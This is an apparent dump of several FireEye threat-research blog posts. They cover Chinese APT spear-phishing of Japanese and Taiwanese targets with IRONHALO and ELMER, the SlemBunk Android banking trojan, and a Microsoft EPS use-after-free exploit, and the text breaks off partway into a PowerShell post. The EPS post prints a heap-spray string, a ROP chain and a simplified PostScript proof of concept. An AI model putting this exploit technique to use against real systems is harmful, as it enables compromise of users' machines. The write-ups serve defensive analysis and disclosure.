  <br /> <br /> Each phishing message contained the same malicious
  Microsoft Word attachment. The malicious attachment resembled an
  article hosted on a legitimate Japanese defense-related website, as
  both discussed national defense topics and carried the same byline.
  The lure documents also used the Japanese calendar, as indicated by
  the 27th year in the Heisei period. This demonstrates that the threat
  actors understand conventional Japanese date notation.</p>
 <p>
  <span class=""type-ML"">IRONHALO Downloader</span></p>
 <p>Following the exploitation of the EPS and CVE-2015-1701
  vulnerabilities, the exploit payload drops either a 32-bit or 64-bit
  binary containing an embedded IRONHALO malware sample. IRONHALO is a
  downloader that uses the HTTP protocol to retrieve a Base64 encoded
  payload from a hard-coded command-and-control (CnC) server and uniform
  resource locator (URL) path.  </p>
 <p>The encoded payload is written to a temporary file, decoded and
  executed in a hidden window. The encoded and decoded payloads are
  written to files named i<span class=""code"">gfxHK[%rand%].dat</span>
  and <span class=""code"">igfxHK[%rand%].exe</span> respectively, where
    <span class=""code"">[%rand%]</span> is a 4-byte hexadecimal number
  based on the current timestamp.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/EPS/EPS%20part%202/table1.png"" />
  <span class=""type-XS"">Table 1. IRONHALO artifacts</span></p>
 <p>IRONHALO persists by copying itself to the current user’s Startup
  folder. This variant sends an HTTP request to a legitimate Japanese
  website using a malformed User-Agent string, as shown in Figure 2. The
  threat actors likely compromised the legitimate site and attempted to
  use it as a staging server for second-stage payloads.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/EPS/EPS%20part%202/figure2.png"" />
  <span class=""type-XS"">Figure 2. IRONHALO HTTP GET request</span></p>
 <h1>
  <span class=""type-ML"">December to Remember</span></h1>
 <p>On December 1, 2015, threat actors launched two additional spear
  phishing attacks exploiting the undisclosed EPS vulnerability and
  CVE-2015-1701. Unlike the Nov. 26 campaign, these attacks targeted
  Taiwanese governmental and media and entertainment organizations.
  Moreover, the exploit dropped a different malware payload, a backdoor
  we refer to as ELMER.</p>
 <h3>
  <span class=""type-ML"">Lure Number One</span></h3>
 <p>The first spear phishing message was sent to a Taiwanese
  governmental employee on Dec. 1. The attachment was created using the
  traditional Chinese character set, and contained a flowchart that
  appeared to be taken from the legitimate Taiwanese government auction
  website <b>hxxp://shwoo.gov[.]taipei/buyer_flowchart.asp</b>. The
  image, shown in Figure 3, is a flowchart detailing how to place a
  trade on the Taipei Nature and Cherish Network website.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/EPS/EPS%20part%202/figure3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Lure Image</span></p>
 <h3>
  <span class=""type-ML"">Lure Number Two</span></h3>
 <p>The second December spear phishing attack targeted Taiwan-based news
  media organizations. The emails originated from the address
    <b>dpptccb.dpp@msa.hinet[.]net </b>(Figure 4),<b> </b>and contained
  the subject <b>DPP's Contact Information Update.</b> Based on the
  email address naming convention and message subject, the threat actors
  may have tried to make the message appear to be a legitimate
  communication from the Democratic Progressive Party (DPP), Taiwan’s
  opposition party.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/EPS/EPS%20part%202/figure4.png"" />
  <span class=""type-XS"">Figure 4. December 1 Lure 2 SMTP Header</span></p>
 <p>Unlike the previous exploit documents, this malicious attachment did
  not contain any visible text when opened in Microsoft Word.</p>
 <h3>
  <span class=""type-ML"">ELMER Backdoor</span></h3>
 <p>The exploit documents delivered during the December campaigns
  dropped a binary containing an embedded variant of a backdoor we refer
  to as ELMER. ELMER is a non-persistent proxy-aware HTTP backdoor
  written in Delphi, and is capable of performing file uploads and
  downloads, file execution, and process and directory listings.</p>
 <p>To retrieve commands, ELMER sends HTTP GET requests to a hard-coded
  CnC server, and parses the HTTP response packets received from the CnC
  server for an integer string corresponding to the command that needs
  to be executed. Table 2 lists the ELMER backdoors observed during the
  December campaigns.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/EPS/EPS%20part%202/table2.png"" />
  <span class=""type-XS"">Table 2. ELMER variants</span></p>
 <p>The ELMER variant <b>6c33223db475f072119fe51a2437a542</b> beaconed
  to the CnC IP address <b>121.127.249.74</b> over port 443. However the
  ELMER sample <b>0b176111ef7ec98e651ffbabf9b35a18</b> beaconed to the
  CnC domain <b>news.rinpocheinfo[.]com</b> over port 443. Both samples
  used the hard-coded User-Agent string “Mozilla/4.0 (compatible; MSIE
  7.0; Windows NT 5.1; SV1)”, as shown in Figure 5.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/EPS/EPS%20part%202/figure5.png"" />
  <span class=""type-XS"">Figure 5. ELMER beacon</span></p>
 <h1>
  <span class=""type-ML"">APT16</span></h1>
 <p>While attribution of the first two spear phishing attacks is still
  uncertain, we attribute the second December phishing campaign to the
  China-based APT group that we refer to as APT16. This is based on the
  use of the known APT16 domain <b>rinpocheinfo[.]com</b>, as well as
  overlaps in previously observed targeting and tactics, techniques and
  procedures (TTPs).</p>
 <h4>
  <span class=""type-ML"">Background</span></h4>
 <p>Taiwanese citizens will go to the polls on January 16, 2016, to
  choose a new President and legislators. According to recent opinion
  polls, the Democratic Progressive Party (DPP) candidate Tsai Ing-wen
  is leading her opponents and is widely expected to win the election.
  The DPP is part of the pan-green coalition that favors Taiwanese
  independence over reunification with the mainland, and the party’s
  victory would represent a shift away from the ruling Kuomintang’s
  closer ties with the PRC. Since 1949, Beijing has claimed Taiwan as a
  part of China and strongly opposes any action toward independence. The
  Chinese government is therefore concerned whether a DPP victory might
  weaken the commercial and tourism ties between China and Taiwan, or
  even drive Taiwan closer to independence. In 2005, the Chinese
  government passed an “anti-secession” law that signified its intention
  to use “non-peaceful” means to stymie any Taiwanese attempt to secede
  from China.</p>
 <h4>
  <span class=""type-ML"">Targeting Motivations</span></h4>
 <p>APT16 actors sent spear phishing emails to two Taiwanese media
  organization addresses and three webmail addresses. The message
  subject read “DPP’s Contact Information Update”, apparently targeting
  those interested in contact information for DPP members or
  politicians. The Chinese government would benefit from improved
  insight into local media coverage of Taiwanese politics, both to
  better anticipate the election outcome and to gather additional
  intelligence on politicians, activists, and others who interact with
  journalists. This tactic is not without precedent; in 2013, the New
  York Times <a href=""http://www.nytimes.com/2013/01/31/technology/chinese-hackers-infiltrate-new-york-times-computers.html"">revealed</a>
  it had been the target of China-based actors shortly after it reported
  on the alleged mass accumulation of <a href=""http://www.nytimes.com/2012/10/26/business/global/family-of-wen-jiabao-holds-a-hidden-fortune-in-china.html"">wealth</a>
  by then-Prime Minister Wen Jiabao and his family. The actors likely
  sought information on the newspaper’s sources in China, who could be
  silenced by the government.</p>
 <p>Compromising these Taiwanese news organizations would also allow the
  actors to gain access to informants or other protected sources, who
  might then be targeted for further intelligence collection or even
  retribution. The webmail addresses, while unknown, were possibly the
  personal-use addresses of the individuals whose corporate domain
  emails were targeted. As corporate networks become more secure and
  users become more vigilant, personal accounts can still offer a means
  to bypass security systems. This tactic exploits users’ reduced
  vigilance when reading their own personal email, even when using
  corporate IT equipment to do so.</p>
 <p>On the same date that APT16 targeted Taiwanese media, suspected
  Chinese APT actors also targeted a Taiwanese government agency,
  sending a lure document that contained instructions for registration
  and subsequent listing of goods on a local Taiwanese auction website.
  It is possible, although not confirmed, that APT16 was also
  responsible for targeting this government agency, given both the
  timeframe and the use of the same n-day to eventually deploy the ELMER backdoor.</p>
 <h4>
  <span class=""type-ML"">We’ve Been Here Before</span></h4>
 <p>One of the media organizations involved in this latest activity was
  targeted in June 2015, while its Hong Kong branch was similarly
  targeted in August 2015. APT16 actors were likely also responsible for
  the June 2015 activity. They sent spear phishing messages with the
  subject “2015 Taiwan Security and Cultural Forum Invitation Form”
  (2015台灣安全文化論壇邀請函), and used a different tool – a tool that we refer to
  as DOORJAMB – in their attempt to compromise the organization. A
  different group, known as <b>admin@338</b>, used LOWBALL malware
  during its <a href=""https://www.fireeye.com/blog/threat-research/2015/11/china-based-threat.html"">Hong
    Kong activity</a>. Despite the differing sponsorship, penetration of
  Hong Kong- and Taiwan-based media organizations continues to be a
  priority for China-based threat groups.</p>
 <p>The difference in sponsorship could be the result of tasking systems
  that allocate targeting responsibility to different groups based on
  their targets’ geographic location. In other words, while media
  organizations are important targets, it is possible that two separate
  groups are responsible for Hong Kong and Taiwan, respectively. The
  suspected APT16 targeting of the Taiwanese government agency – in
  addition to the Taiwanese media organizations – further supports this possibility.</p>
 <h1>
  <span class=""type-ML"">Conclusion</span></h1>
 <p>Table 3 contains a summary of the phishing activity detailed in this
    blog.<img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/EPS/EPS%20part%202/table3.png"" />
  <span class=""type-XS"">Table 3. Activity summary</span></p>
 <p>These clusters of activity raise interesting questions about the use
  of an identical silently-patched vulnerability, possibly by multiple
  threat groups. Both Japan and Taiwan are important intelligence
  collection targets for China, particularly because of recent changes
  to Japan’s pacifist constitution and the upcoming Taiwanese election.
  Based on our visibility and available data, we only attribute one
  campaign to the Chinese APT group APT16. Nonetheless, the evidence
  suggests the involvement of China-based groups.</p>",http://www.fireeye.com/blog/threat-research/2015/12/the-eps-awakens-part-two.html
"SlemBunk: An Evolving Android Trojan Family Targeting Users of Worldwide
Banking Apps","<p>FireEye mobile researchers recently identified a series of Android
  trojan apps that are designed to imitate the legitimate apps of 33
  financial management institutions and service providers across the
  globe. We dub the family “SlemBunk,” and have seen it covering three
  major continents: North America, Europe, and Asia Pacific.</p>
 <p>SlemBunk apps masquerade as common, popular applications and stay
  incognito after running for the first time. They have the ability to
  phish for and harvest authentication credentials when specified
  banking and other similar apps are launched. At the time of this
  writing, we can confirm that a set of the control servers gathering
  gleaned credentials is still live and active.</p>
 <p>We have not observed any instances of SlemBunk on Google Play, so
  users will only get infected if the malware is sideloaded or
  downloaded from a malicious website. Newer versions of SlemBunk were
  observed being distributed via porn websites. Users who visit these
  sites are incessantly prompted to download an Adobe Flash update to
  view the porn, and doing so downloads the malware.</p>
 <ul> <li>Our comprehensive investigation of SlemBunk has led to the
    identification of more than 170 samples in the wild. These SlemBunk
    samples exhibit a range of characteristics and behaviors,
  including:</li> <li>Highly customized login UI for a variety of
    financial management services such as high profile banks;</li>
    <li>Running in the background and monitoring the active running
  processes;</li> <li>Detecting the launch of specified legitimate apps
    and intelligently displaying corresponding fake login
  interfaces;</li> <li>Hijacking user credentials and transmitting to a
    remote command and control (CnC) server;</li> <li>Harvesting and
    exfiltrating sensitive device information to the CnC servers
    including phone number, installed app list, device model, OS
  version;</li> <li>Receiving and executing remote commands sent through
    text messages and network traffic;</li> <li>Persisting on the
    infected device via device administrator privilege.</li> </ul>
 <p>Our in-depth analysis into the full set of samples provides more
  insights into this malware family. Since its debut, SlemBunk has gone
  through several iterations, with each one raising the bar of
  sophistication by adding more advanced capabilities. Based on our
  examination of SlemBunk over time, we observed the following developments:</p>
 <p>Advanced features are added to support more remote control commands;</p>
 <ul> <li>Remote CnC servers keep changing among samples;</li> <li>More
    financial services apps are added into the list, with new UI and
    their corresponding logic;</li> <li>Different levels of obfuscation
    mechanisms are adopted to avoid detection.</li> </ul>
 <p>Through our investigation, we have discovered SlemBunk spoofing the
  apps of 31 banks across the globe – some of which are among the
  biggest banks in the world – as well as users of two popular mobile
  payment service provider apps.</p>
 <p>While financial gain is the primary goal of this malware, SlemBunk
  is also interested in user data. This is reflected by its attempt to
  hijack the login credentials of high profile Android applications,
  including popular social media apps, utility apps instant messaging apps.</p>
 <h2>Technical Details</h2>
 <p>The remainder of this blog presents the technical and operational
  aspects of this malware in greater detail.</p>
 <h3>
  <span class=""type-M"">Major Components</span></h3>
 <p>The core objective of SlemBunk is to phish for authentication
  credentials – primarily for financial institutions – by pushing a fake
  login interface when a specified app is running in the foreground.
  Figure 1 – the Manifest file from one of the non-obfuscated samples
  with package name &quot;org.slempo.service&quot; – shows an overview
  of the main components of SlemBunk.</p>
 <ul> <li>
    <b>
      <i>ServiceStarter</i></b>: An Android receiver that will be
    invoked once an app is launched or the device boots up. Its
    functionality is to start the monitoring service,
    <i>MainService</i>, in the background.</li> <li>
    <b>
      <i>MainService</i></b>: An Android service that runs in the
    background and monitors all running processes on the device. It
    prompts the user with an overlay view that resembles the legitimate
    app when that app is launched. This monitoring service also
    communicates with a remote host by sending the initial device data,
    notifying of device status and app preferences.</li> <li>
    <b>
      <i>MessageReceiver</i></b>: An Android receiver that handles
    incoming text messages. In addition to the functionality of
    intercepting the authentication code from the bank, this component
    also acts as the bot client for remote command and control.</li> <li>
    <b>
      <i>activities/Card</i></b>: One UI view designed to mimic those of
    the targeted apps.</li> <li>
    <b>
      <i>MyDeviceAdminReceiver</i></b>: Device admin functionality
    requested the first time this app is launched. This makes the app
    more difficult to remove.</li> </ul>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/SlemBunk/Figure3.png"" /></p>
 <p>
  <span class=""type-XS""> Figure 1. SlemBunk main components</span></p>
 <p>Figure 2 offers a glance into the execution flow of the malware.
  When the app is launched for the first time, it activates the
  registered receiver, which subsequently starts the monitoring service
  in the background. On the surface it pops up a fake UI claiming to be
  Adobe Flash Player, or other advertised applications, and requests to
  be the device admin. Upon being granted admin privileges, it removes
  its icon from the launcher and remains running in the background. A
  corresponding UI requesting for authentication credentials shows up
  when one of the specified apps is detected running in the foreground.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/SlemBunk/Figure4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2. The workflow graph of SlemBunk</span></p>
 <p>
  <span class=""type-M"">Targeted App Detection &amp; Interface Overlay</span></p>
 <p>SlemBunk employs a long running service in the background
  (<i>MainService</i>), which schedules a few tasks. One of the tasks is
  to query all the running processes and check if any of the specified
  apps are running in the foreground. The detection of a legitimate app
  is as simple as comparing the package name of the top running app to
  that of a specified app.  </p>
 <p>We noticed the SlemBunk authors have invested time in making sure
  that the look and feel of the phishing UI closely resembles that of
  the original. In some instances, the phishing interface requests that
  the user type in their credentials twice rather than once. It also
  forces the user to go through a fake verification process, which we
  suspect is to increase the user’s confidence in its authenticity.</p>
 <h3>
  <span class=""type-M"">Remote Communication</span></h3>
 <p>SlemBunk utilizes a simple yet effective remote communication
  mechanism that enables a server to command and control theinstalled
  malware. We identified two ways a SlemBunk sample communicates with
  its control server:</p>
 <ul> <li>
    <b>HTTP</b>: Many of the remote server IPs are hardcoded in the
    source code for early developed samples. For newer samples, SlemBunk
    authors used basic Base64 encoding in the hope of fending off
    reverse engineering. Figure 3 shows a short snippet of code that
    decodes the encoded data.</li> </ul>
 <p>There are primarily three requests from the client to the server:</p>
 <ul> <li>
    <i>Initial Checkin:</i> this request informs the server about
    successful installation and running, with device data being uploaded
    to the server. That data includes device model, OS version, phone
    number, app list, and country name.  </li> </ul>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/SlemBunk/Figure7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3. The Base64 decoding of SlemBunk remote server</span></p>
 <ul> <li>
    <i>Regular Status Report:</i> this request informs the server about
    its status. The status report often covers the status of SMS
    listening and interception, the phone number, and the locking
    status. Figure 4 shows the captured traffic for this process.</li> </ul>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/SlemBunk/replacementfig6slem.jpg"" />
  <span class=""type-XS"">Figure 4. Regular Status Report</span></p>
 <ul> <li>
    <i>Phished Data Upload:</i> once the malware gets a hold of
    credentials, it sends them to the remote server.  </li> </ul>
 <ul> <li>
    <b>SMS</b>: The remote server is capable of controlling the
    malicious app’s behavior through text messages. For instance,
    &quot;<i>intercept_sms_stop</i>&quot; stops the interception of SMS
    messages and &quot;<i>intercept_sms_start</i>&quot; restarts the
    interception. Command &quot;<i>lock</i>&quot; mutes the device’s
    audio system, which effectively conceals the arrival of text
    messages or phone calls. Command &quot;<i>wipe_data</i>&quot; wipes
    all the data partition of the infected device. The complete list of
    supported commands is shown in Appendix A. The relevant code is
    shown in Figure 5.</li> </ul>
 <h3>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/SlemBunk/Figure11.png"" /></h3>
 <p>
  <span class=""type-XS"">Figure 5. SMS based command &amp; control</span></p>
 <h3>
  <span class=""type-M"">Evolution of the Family</span></h3>
 <p>SlemBunk has evolved throughout time. The earliest samples mainly
  target users of popular social networking apps, but later samples
  started to be more focused on defrauding users of financial services
  apps, with a clear objective on financial gain. Among all the
  specified apps, we have observed that banks in Australia are among
  SlemBunk’s favorites, with banks in the U.S. coming in second.</p>
 <p>As SlemBunk expands its coverage of banks, its code has also become
  more sophisticated. Notably, later samples utilize different
  techniques to obscure potential reverse engineering. Figure 4 shows an
  obscured string that is Base64 encoded. In a few cases, SlemBunk
  authors took advantage of a commercial packer, DexProtector, which was
  designed to protect apps from being pirated. However, when used by a
  malicious application, it raises the difficulty for the analysis process.</p>
 <h2>
  <span class=""type-M"">Conclusion</span></h2>
 <p>The rise and evolution of the SlemBunk trojan clearly indicates that
  mobile malware has become more sophisticated and targeted, and
  involves more organized efforts. We have already seen crackdowns on
  malware campaigns targeting mobile banking users [1, 2], but we do not
  expect this type of activity to go away anytime soon. To protect
  yourself from these threats, FireEye suggests that you:</p>
 <ul> <li>Do not install apps outside the official app store.</li>
    <li>Keep Android devices updated. (Upgrading to the latest version
    of OS will provide some security, but it does not guarantee that you
    will remain protected.)</li> </ul>
 <p>To detect and defend against such attacks, we advise our customers
  to deploy our mobile security solution, FireEye MTP/MSM. This helps
  our clients gain visibility into threats in their user base, and also
  enables them to proactively hunt down devices that have been
  compromised. In addition, we advise our customers with NX appliances
  to ensure that Wi-Fi traffic is scanned by NX appliances to extend
  coverage to mobile devices.</p>
 <p>[1]<a href=""http://blog.trendmicro.com/trendlabs-security-intelligence/malware-campaign-targets-south-korean-banks-uses-pinterest-as-cc-channel/"">http://blog.trendmicro.com/trendlabs-security-intelligence/malware-campaign-targets-south-korean-banks-uses-pinterest-as-cc-channel/</a></p>
 <p>[2]<a href=""http://www.symantec.com/connect/blogs/android-banking-trojan-delivers-customized-phishing-pages-straight-cloud"">http://www.symantec.com/connect/blogs/android-banking-trojan-delivers-customized-phishing-pages-straight-cloud</a></p>
 <h3>
  <span class=""type-M"">Appendix A: List of the Control Commands
    Delivered via SMS</span></h3>
 <ul> <li>#block_numbers</li> <li>#control_number</li>
  <li>#disable_forward_calls</li> <li>#intercept_sms_start</li>
  <li>intercept_sms_stop</li> <li>#lock</li>
  <li>unblock_all_numbers</li> <li>unblock_numbers</li> <li>unlock</li>
  <li>update_html</li> <li>wipe_data</li> <li>check</li>
  <li>#check_gps</li> <li>control_number</li> <li>grab_apps</li>
  <li>#listen_sms_start</li> <li>listen_sms_stop</li> <li>#sentid</li>
  <li>show_dialog</li> <li>#show_html</li> </ul>",http://www.fireeye.com/blog/threat-research/2015/12/slembunk_an_evolvin.html
The EPS Awakens,"<p>On September 8, FireEye <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2015/09/attack_exploitingmi.html"">published
  details</a> about an attack exploiting zero day vulnerabilities in
  Microsoft Office (<a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2545"">CVE-2015-2545</a>)
  and Windows (<a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2546"">CVE-2015-2546</a>).
  The attack was particularly notable because it leveraged PostScript to
  drive memory corruption in a way that had never been seen before. The
  exploit used similar strategies as browser exploits in common
  languages such as JavaScript and Flash, but PostScript served as an
  overlooked attack vector that is powerful and convenient in Office.</p>
 <p>Following the release of the patch for CVE-2015-2545, FireEye
  notified Microsoft of a way to bypass the patch. Microsoft not only
  fixed the bypass, but proactively hardened code throughout the
  Encapsulated PostScript (EPS) filter. The updates were quietly
  released on November 10 (Patch Tuesday).</p>
 <p>At around 10:00AM in Japan on November 26 (around close of business
  the day before Thanksgiving in the U.S.), threat actors launched a
  spear phishing campaign. The emails contained document attachments
  that exploited a previously unknown EPS vulnerability. But there was a
  catch: the vulnerability was proactively patched in the Microsoft
  update released two weeks earlier.</p>
 <p>The spearphishing emails to FireEye EX customers were blocked in the
  wild. FireEye appliances detect the exploit as
  Exploit.Dropper.docx.MVX and Malware.Binary.Docx.</p>
 <p>In the first part of this blog series, we summarize recent threat
  group activity using this exploit and provide complete technical
  details of the vulnerability. Stay tuned for part two wherein we
  outline the operational details of the attack.</p>
 <h4>Activity Summary</h4>
 <p>In late November and early December of 2015, FireEye observed
  multiple spear phishing campaigns exploiting a previously unknown
  Microsoft Office EPS vulnerability (detailed below) and Windows local
  privilege escalation vulnerability CVE-2015-1701. Over the course of
  several days, known and suspected China-based advanced persistent
  threat (APT) groups sent phishing emails containing malicious Word
  attachments to Japanese and Taiwanese organizations in the financial
  services, high-tech, media and government sectors respectively.</p>
 <p>These attachments exploited a silently patched user-mode Microsoft
  EPS vulnerability (similar to Microsoft EPS use-after-free
  vulnerability CVE-2015-2545) and subsequently used CVE-2015-1701 to
  obtain SYSTEM level access to compromised machines. Following
  successful exploitation of each vulnerability, the exploit shellcode
  deployed either the IRONHALO downloader or the ELMER backdoor. FireEye
  currently detects IRONHALO as Trojan.IRONHALO.Downloader and ELMER as Backdoor.APT.Suroot.</p>
 <h4>Vulnerability Details – Encapsulated PostScript dict copy Use-After-Free</h4>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/EPS/epsfig1.jpg"" /></p>
 <p>In the form <i>dict<sub>1</sub></i> <i>dict<sub>2</sub></i>
  <b>copy</b>, the <b>copy</b> operator copies all of the elements from
  the first operand (<i>dict<sub>1</sub></i>) into the second operand
  (<i>dict<sub>2</sub></i>). <a href=""http://www-cdf.fnal.gov/offline/PostScript/PLRM2.pdf"">The
    PostScript Language Reference Manual (PLRM)</a>, as cited in Figure
  1, states that the copy operator does not affect elements remaining in
  the second operand. For example, if <i>dict<sub>1</sub> </i>contained
  an element under key <i>k1</i>, and <i>dict<sub>2</sub> </i>contained
  elements under keys <i>k1</i> and <i>k2</i>, then the operation
  <i>dict<sub>1</sub></i> <i>dict<sub>2</sub></i> <b>copy</b> should
  overwrite the element under <i>k1</i>, but should not affect the
  element under <i>k2</i>.</p>
 <p>However, Microsoft’s EPS deviates from this standard. In Microsoft’s
  implementation, the <b>copy </b>operator iteratively deletes all
  key-value entries from the <i>dict<sub>2</sub></i> internal hash
  table. Then, it deletes the hash table itself, and allocates a new
  one. Finally, it copies elements from <i>dict<sub>2</sub></i> into
  <i>dict<sub>2</sub></i>. This deletion process is depicted in Figure 2.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/EPS/epsfig2.jpg"" /></p>
 <p>Using the <i>dict<sub>1</sub></i> <i>dict<sub>2</sub></i> <b>copy
  </b>operation while enumerating <i>dict<sub>2</sub></i> with <b>forall
  </b>causes a use-after-free. During each iteration of the
  <b>forall</b> loop, <i>dict<sub>2</sub></i> dereferences a pointer
  (ptrNext) to push the next key-value pair onto the operator stack.
  When <b>copy</b> deletes the next key-value pair, ptrNext becomes
  stale. The next iteration of the <b>forall</b> loop will then push
  objects from the stale pointer onto the operator stack.</p>
 <p>In an attack scenario, the attacker can allocate memory under the
  stale pointer. The attacker can then supply data that the
  <b>forall</b> enumerator reads as a key-value pair. In the appendix,
  we include a minimized PoC that shows how to allocate a string under
  the stale pointer and forge a key-value pair.</p>
 <h4>Full Read and Write Development</h4>
 <p>The attacker gains access to memory by forging a string.
  Specifically, the attacker places a forged key-value pair under the
  stale ptrNext, and the key-value pair points to a forged string. The
  attacker uses a hardcoded address (130e0020h) in the forged key-value
  pair, and sprays memory at the address with PostScript strings. Figure
  3 shows the PostScript that creates the sprayed string object, and the
  layout of the string in memory.</p>
 <p>
  <span class=""code"">/fakestr
    &lt;28000e1358000e13bebafeca41414141414141414141414141414141030000004141414141414141414<br />
    1414124000e1300000000ffffff7fbebafeca41414141414141414141414141414141414141414141414<br />
    14141414100000000ffffff7f&gt; def</span></p>
 <p>
  <span class=""code"">0:000&gt; dd 130e0000<br />  130e0000  00000000
    00000000 00000000 00000000<br />  130e0010  00000000 00000000
    00000000 00000000<br />  130e0020  130e0028 130e0058 cafebabe
    41414141<br />  130e0030  41414141 41414141 41414141 00000003<br />
    130e0040  41414141 41414141 41414141 130e0024<br />  130e0050 
    00000000 7fffffff cafebabe 41414141<br />  130e0060  41414141
    41414141 41414141 41414141<br />  130e0070  41414141 41414141
    00000000 7fffffff</span></p>
 <p>
  <span class=""type-XS"">Figure 3: The attacker's sprayed PostScript string</span></p>
 <p>Each PostScript string object allocates a buffer to store the actual
  contents of the string. The address and size of this buffer is stored
  within the string object. In the attacker’s forged string object, the
  address of the buffer is 0, and the size of the buffer is 0x7fffffff.</p>
 <h4>Return-Oriented Programming</h4>
 <p>Once the attacker has forged a string with size 0x7fffffff, they can
  use the string to freely read and write process memory. The attacker
  uses this capability to search for ROP gadgets and build a ROP chain.</p>
 <p>
  <span class=""code"">0:000&gt; dd /c 1 130e1032<br />  130e1032 
    60e2b53a      // retn_gadget<br />  130e1036  60e2b53a      //
    retn_gadget<br />  130e103a  00000000<br />  130e103e 
    00000000<br />  130e1042  60e69f80      // stack_pivot_gadget<br />
    130e1046  60e398cd      // set_eax_gadget, eax = 0xd7<br />
    130e104a  00000000<br />  130e104e  00000000<br />  130e1052 
    00000000<br />  130e1056  777e5695      // ntcreateevent_gadget+0x5,
    NtProtectVirtualMemory<br />  130e105a  130e3000      // shellcode
    starts here<br />  130e105e  ffffffff<br />  30e1062  130e0200<br />
    130e1066  130e0204<br />  130e106a  00000040<br />  130e106e  130e0208</span></p>
 <p>
  <span class=""code"">0:000&gt; u 60e2b53a<br />  EPSIMP32+0xb53a:<br />
    60e2b53a c20c00          ret     0Ch<br />  0:000&gt; u
    60e69f80<br />  EPSIMP32!RegisterPercentCallback+0x2234e:<br />
    60e69f80 94              xchg    eax,esp<br />  60e69f81
    c3              ret<br />  0:000&gt; u 60e398cd<br />
    EPSIMP32+0x198cd:        // ecx = 130e1000, eax = 0xd760e398cd
    8b4114          mov     eax,dword ptr [ecx+14h]<br />  60e398d0
    c3              ret<br />  0:000&gt; u 777e5695<br />
    ntdll!NtCreateEvent+0x5:<br />  777e5695 ba0003fe7f      mov    
    edx,offset SharedUserData!SystemCallStub<br />  777e569a
    ff12            call    dword ptr [edx]<br />  777e569c
    c21400          ret     14h</span></p>
 <p>
  <span class=""type-XS"">Figure 4: Attacker's ROP chain</span></p>
 <p>The ROP chain, shown in Figure 4, uses a few known tricks to bypass
  security products. First, the ROP chain skips 5 bytes past the
  beginning of ntdll!NtCreateEvent. This would bypass any hooks placed
  on the beginning of the routine (and is known as “hook hopping”), but
  the real purpose of this offset is to pass over an instruction that
  sets eax. This allows the attacker to specify their own parameter in
  eax, and call an arbitrary system call instead of NtCreateEvent. The
  attacker chooses the system call NtProtectVirtualMemory, which marks
  the attacker’s shellcode as executable. Since the system call numbers
  differ between environments, the attacker reads the correct value for
  eax from the ntdll!NtProtectVirtualMemory function (which is the
  user-mode function that is normally used to call the
  NtProtectVirtualMemory syscall).</p>
 <p>To transfer execution to the ROP chain, the attacker forges a file
  type object. Within the forged file type object, the attacker modifies
  the bytesavailable function pointer to point to a pivot (Figure 5).
  Then, when the attacker uses the forged object in PostScript, it calls
  the pivot and transfers execution to the ROP chain. When the ROP chain
  is complete, it returns into the attacker’s shellcode.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/EPS/epsfig5.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: bytesavailable operator with the
    forged file type object</span>
  <br /> </p>
 <h4>Shellcode</h4>
 <p>Once the ROP chain finishes and returns to the attacker’s shellcode,
  the shellcode loads a DLL that exploits CVE-2015-1701 to elevate the
  process to SYSTEM. The CVE-2015-1701 exploit is based on published
  source code from GitHub. Once the shellcode process has SYSTEM
  privileges, it will execute further payloads to be discussed in part
  two of this series.</p>
 <h4>Acknowledgements</h4>
 <p>Thank you to Wang Yu, Dan Regalado and Junfeng Yang for their
  contributions to this blog.</p>
 <h4>Appendix<br /> Simplified PoC</h4>
 <p>
  <span class=""code"">%% Create dict2 and fill it with<br />  %%  several
    key-value pairs<br />  /dict2 5 dict def<br />  dict2 begin<br />
    /k1 1000 array def<br />  /k2 1000 array def<br />  …<br />  dict2 end</span></p>
 <p>
  <span class=""code"">%% Create dict1 and fill it with<br />  %%  one
    key-value pair under k1<br />  /dict1 3 dict def<br />  dict1
    begin<br />  /k1 1000 array def<br />  dict1 end</span></p>
 <p>
  <span class=""code"">%% Begin forall enumeration on dict2<br />  dict2
    {<br />       …<br />      % Destroy dict2’s internal
    hash-table,<br />      %  freeing all key-value pairs<br />     
    dict1 dict2 copy<br />      …<br />      % Create a new string to
    overwrite the<br />      % freed key-value pair k2.<br />      % The
    string contains a forged key-value pair<br />      44 string<br />
        0
    &lt;00000000ff0300000005000000000000000000002000e01303000000000000000000000044444444&gt;
    putinterval<br />      % Next iteration of the loop uses
    stale.<br />      % ptrNext, which points into the above
    string,<br />      %  and reads a forged key-pair<br />      …<br />
    } forall</span></p>",http://www.fireeye.com/blog/threat-research/2015/12/the_eps_awakens.html
Uncovering Active PowerShell Data Stealing Campaigns,"<p>Loved by administrators, Windows PowerShell enables users to
  effectively perform automation and administrative tasks on local and
  remote systems. However, its power, ease of use, and widespread use
  has also made it attractive to attackers.</p>
 <p>Researchers first began demonstrating attacks involving PowerShell
  around 2010, and they were crafting more sophisticated PowerShell
  attack methodologies and toolkits by late 2011. Gradually, PowerShell
  started to show up in malware campaigns, although at the time it was
  only observed being used to complete some steps in the attack cycle.
